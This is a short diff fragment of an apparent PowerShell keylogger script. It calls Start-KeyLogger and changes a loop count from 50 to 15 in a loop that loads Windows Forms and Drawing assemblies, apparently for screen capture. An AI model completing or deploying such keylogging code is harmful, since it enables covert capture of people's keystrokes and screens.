@@ -129,7 +129,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 Start-KeyLogger
 
 $i = 0
-while($i -lt 50){
+while($i -lt 15){
 
   Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
